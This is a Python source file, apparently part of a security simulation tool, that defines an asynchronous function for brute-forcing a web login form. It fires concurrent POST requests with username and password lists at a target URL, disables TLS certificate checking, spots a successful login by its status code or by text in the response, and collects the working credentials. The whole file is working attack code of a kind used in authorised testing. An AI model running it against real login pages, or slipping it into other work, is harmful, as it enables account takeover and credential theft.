from app.simulations.simulation_params import BruteForceParams
from typing import Optional, List, Dict, Any
import httpx
import asyncio
from app.simulations.utils import HTTPMethod


async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    simulation_halted = False

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        total_attempts_made += 1
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            response = await session.post(
                str(params.target_url), 
                data=login_payload,
                timeout=15.0,
                follow_redirects=True
            )
            response_text_lower = response.text.lower()
            success = False
            if params.success_status_code and response.status_code == params.success_status_code:
                success = True
            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response_text_lower:
                success = True
            if success:
                print(f"Successful Login! User: {username}, Password: {password}")
                credentials_found.append({"username": username, "password": password})
                return True
        except httpx.RequestError:
            pass
        return False

    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            print(f"Trying passwords for user '{username}'...")
            password_tasks = [worker(client, username, password) for password in params.passwords]
            results = await asyncio.gather(*password_tasks, return_exceptions=True)
            if any(res for res in results if isinstance(res, bool) and res):
                if params.stop_on_first_success:
                    print(f"Password found for '{username}' and stop_on_first_success=True. Simulation is being stopped.")
                    simulation_halted = True
                    break

    result = {
        "target_url": str(params.target_url),
        "total_attempts_made": total_attempts_made,
        "credentials_found": credentials_found,
        "simulation_halted_early": simulation_halted and bool(credentials_found)
    }
    print(f"Brute Force Simulation Completed: {result}")
    return result